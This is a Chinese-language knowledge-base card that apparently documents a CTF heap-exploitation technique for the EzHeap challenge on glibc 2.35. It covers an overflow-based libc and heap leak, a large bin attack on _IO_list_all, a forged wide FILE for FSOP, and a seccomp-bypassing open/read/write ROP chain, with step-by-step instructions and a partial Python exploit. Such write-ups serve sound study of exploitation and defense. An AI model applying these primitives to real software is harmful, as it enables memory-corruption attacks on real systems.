---
id: binary-pwn-heap-glibc235-overflow-largebin-io-list-all-wide-file-orw
title: glibc 2.35 无 UAF 堆溢出：相邻块覆盖泄 libc/heap，large bin attack 改 _IO_list_all 伪造 wide FILE 经 leave_ret 转 open/read/write
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc235-heap-overflow-largebin-io-list-all-wide-file-orw
tags:
- pwn
- heap
- glibc235
- heap-overflow
- largebin
- io-list-all
- fsop
- wide-file
- seccomp
- orw
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V391
  verified_at: '2026-11-09T11:33:27+08:00'
  notes: 已对照原文与全部30张图片核对：EzHeap 无 UAF（delete 清指针，img17），add/edit 上限 0x500（img15-18），seccomp 白名单 read/write/open/mprotect/exit（img19），0x450/0xe8 溢出泄 libc -0x21ae70、0x58 块 <<12 泄 heap（img21-25），0x250+0x458/0x448 布局与 0x461 largebin victim、_IO_list_all-0x20、_IO_wfile_jumps、leave_ret/0x16a050+26、open(2) syscall ORW、add(0x4e0)/add(0x440) 触发后 exit，均与 exp 及 flag_is_not_here 截图一致。--force 理由核对：与既有 binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw 相比，FSOP 终点相同（largebin→_IO_list_all→wide FILE→ORW），但入口原语（无 UAF 的 edit 长度失控溢出 vs UAF stale slot 伪造 0x430）、泄露方式（相邻块溢出 show vs stale READ）与 final pivot/ORW（leave_ret/0x16a050+26 + open(2) vs setcontext+0x3d + openat2）均不同，库内同尾部不同入口的 largebin/FSOP 卡已有先例，保留为独立入口变体成立。glibc 2.35 为题目环境版本非受影响区间，未设 affected_versions 正确；无 CVE，路径 binary/pwn/heap 合法。PoC 为原文 exp 整理，未复跑。
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc235-overflow-largebin-io-list-all-wide-file-orw/
draft: false
kb_aliases:
- EzHeap
- ciscn 2024 EzHeap
- 无 UAF 堆溢出 largebin
- _IO_list_all largebin attack
- wide FILE leave_ret ORW
- seccomp open 直调
---

## 一句话结论

程序没有 UAF，但 `edit` 的长度上限（0x500）大于实际块大小，形成堆溢出；在 glibc 2.35 上先用相邻块覆盖让 `show` 读出 unsorted/smallbin 中的 libc 指针、并用堆指针 `<<12` 得到 heap 基址，再排布多个 large chunk，溢出改写 largebin chunk 的 `bk_nextsize = _IO_list_all - 0x20` 并在堆上伪造 wide FILE，申请 0x4e0/0x440 触发 large bin attack 把 `_IO_list_all` 指向假 FILE；退出时 `_IO_flush_all_lockp` 经 `_IO_wfile_jumps` 走到 `leave`/`setcontext` 类 gadget 把栈 pivot 到堆上的 ORW 链，用 `syscall` 直调 `open(2)`/`read`/`write` 读出 flag（seccomp 只放行 read/write/open/mprotect/exit，libc 的 `open()` 会走 openat 被拦）。

## 原理

- **入口：长度校验缺失的堆溢出**：`add` 限制 size ≤ 0x500，`edit(idx, size)` 只校验 size ≤ 0x500 而不校验该块实际大小，`read(0, ptr, size)` 可覆盖后续 chunk 的 header/data；`delete` 会清空指针，因此没有 UAF，所有原语都来自溢出。
- **泄露 libc**：先分配大块（0x450）把 fastbin/unsorted 中的块整理进 smallbin，再分配相邻的 0xe8 块；用 0x258 字节的溢出覆盖到下一块的数据区并留标记，`show` 按保存的 size 打印，读到相邻空闲块的 `fd`/`bk`（指向 `main_arena` 区域），减去固定偏移（示例 libc 为 0x21ae70）得到 libc 基址。
- **泄露 heap**：重新分配 0x58 块后用 0xa8 字节溢出写入标记，`show` 读出块内的堆指针，`<<12` 得到堆基址（堆页对齐）。
- **large bin attack 写 `_IO_list_all`**：largebin 插入维护同尺寸链时执行 `victim->bk_nextsize->fd_nextsize = victim`（`fd_nextsize` 在 chunk+0x20）；将 `victim->bk_nextsize` 设为 `_IO_list_all - 0x20`，写原语即 `_IO_list_all = victim`，victim 是堆上伪造的 FILE（示例为 chunk0+0xe0）。
- **伪造 wide FILE 触发 FSOP**：`_IO_flush_all_lockp` 在 exit 时遍历 `_IO_list_all`，按 `_mode` 与 `_wide_data->write_ptr > write_base` 决定是否 flush；把 `_mode` 置 1、伪造 `_wide_data` 使写指针大于基址，即进入 wide 路径；主 vtable 用 `_IO_wfile_jumps`（仍落在合法 vtable 区间）。路径最终到 `leave;ret`/`setcontext` 类 magic gadget，从堆上恢复 `rsp` 并执行布置好的 ROP。
- **seccomp 与 ORW**：BPF 白名单只允许 `read/write/open/mprotect/exit` 系统调用；glibc 的 `open()` 封装实际发的是 `openat(257)`，会被 KILL，所以 ROP 必须直接 `rax=2; syscall` 调 `open("./flag")`，再 `read(fd, buf, 0x50)`、`write(1, buf, 0x50)`。
- **触发**：菜单 quit 调用 `exit()`，进入 `_IO_flush_all_lockp`，假 FILE 链执行后输出 flag（文章本地实测得到 `flag_is_not_here`）。

## 触发条件

- 目标为 glibc 2.35 环境（文章题目的 libc；其他版本需重算 main_arena、_IO_wfile_jumps、gadget 偏移）。
- 程序提供 add/delete/edit/show，`edit` 可写长度大于块实际大小（堆溢出），且 delete 清指针（无 UAF）。
- 可分配/控制多个 0x400 以上的 large chunk，用于伪造 largebin victim 与假 FILE。
- seccomp 只放行 read/write/open/mprotect/exit，且题目以 exit 触发 flush。

## 利用步骤

1. `add(0x450)` 整理 bin 链，`add(0xe8)` 造相邻块；`edit(1, 0x260, b'a'*0x258 + b'kkkkkkkk')` 溢出，`show(1)` 读标记后的 `fd`/`bk`，`libc_base = leak - 0x21ae70`。
2. `delete(0); delete(1)` 清理索引后 `add(0x58)`，`edit(0, 0xb0, b'k'*0xa8 + b'ffffffff')`，`show(0)` 读堆指针并 `<<12` 得 heap 基址。
3. 布局：`add(0x250)`、`add(0x458)`、`add(0x458)`、`add(0x448)`、`add(0x448)`；`delete(2)`、`add(0x498)`、`delete(4)` 调整 bin。
4. 把一个块写上 ORW 链（`"./flag"` + pop rdi/rsi/rdx/rax + syscall 序列），记下其堆地址。
5. 构造 fake FILE/largebin 载荷：`b'\x00'*0x258 + p64(0x461) + pl`，`pl` 中含 `leave_ret`、`_IO_list_all-0x20`、`_IO_wfile_jumps`、宽数据指针与 magic gadget 等；`edit(1, 0x500, payload)` 从 0x250 块溢出覆盖下方 large chunk。
6. `add(0x4e0)`、`add(0x440)` 触发 large bin attack，`p _IO_list_all` 可看到其变为堆地址（假 FILE）。
7. 菜单 quit → `exit()` 触发 `_IO_flush_all_lockp` → wide FILE 路径 → 栈 pivot → ORW 输出 flag。

## PoC

按文章 exp 整理的关键片段（偏移/地址以目标 libc 与堆布局为准，未在本机复跑）：

```python
# 泄 libc
add(0x450, 'bbbb'); add(0xe8, 'bbbb')
edit(1, 0x260, b'a'*0x258 + b'kkkkkkkk'); show(1)
libc_base = leak - 0x21ae70
delete(0); delete(1)

# 泄 heap
add(0x58, 'a'); edit(0, 0xb0, b'k'*0xa8 + b'ffffffff'); show(0)
heap_base = leak << 12

# 布局 + ORW 链（省略寄存器 gadget 明细）
add(0x250,'p'); add(0x458,'a'); add(0x458,'a'); add(0x448,'a'); add(0x448,'a')
delete(2); add(0x498,'a'); delete(4)
# orw 链写入某块后：
pl  = p64(0) + p64(leave_ret) + p64(0) + p64(io_list_all - 0x20)
pl += ...  # _IO_wfile_jumps / wide_data / magic gadget
edit(1, 0x500, b'\x00'*0x258 + p64(0x461) + pl)
add(0x4e0, 'a'); add(0x440, 'b')
quit()   # exit -> _IO_flush_all_lockp -> ORW
```

## 变体与关联

- 关联卡片：[[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]（同为 2.35 largebin→_IO_list_all→wide FILE→ORW，但入口是 UAF stale slot 且用 openat2；本卡是无 UAF、纯堆溢出入口并直调 open）；[[binary-pwn-heap-house-of-orange-single-free-fastbin-malloc-hook-onegadget]]（同篇文章另一题，2.23 orange+fastbin）；[[binary-pwn-heap-glibc239-largebin-apple2-tcache-encryption-libc-highbyte]]、[[binary-pwn-heap-house-of-cat-wfile-seekoff-wide-vtable-bypass-vtable-check]]（其他 largebin/FSOP 变体）。
- 变体：`_IO_wfile_jumps` 换 house of apple/cat 的 vtable；ORW 中 open 可换 openat/openat2（取决于 seccomp 放行号）；无 show 时可通过 stdout/IO 链泄地址。
- 边界：glibc 版本偏移必须匹配；safe-linking 影响 tcache/fastbin 但不影响本 largebin 写；seccomp 若按 arch 校验或禁止 open 需换 ABI/系统调用。

## 检测与防御

- 对该类 CTF 题：升级 glibc 不能消除所有 FSOP；比赛外无通用“防御”，重点是修补程序里的长度校验（edit size 必须 ≤ 实际块大小）与 seccomp 白名单至少覆盖 openat。
- 防御视角：启用全量 RELRO/CFI 不阻止本链（数据面攻击）；监控异常 large bin 操作与 `_IO_list_all` 指向堆的现象需要 instrumented allocator；真实业务应避免自定义堆菜单与可写长度失控。
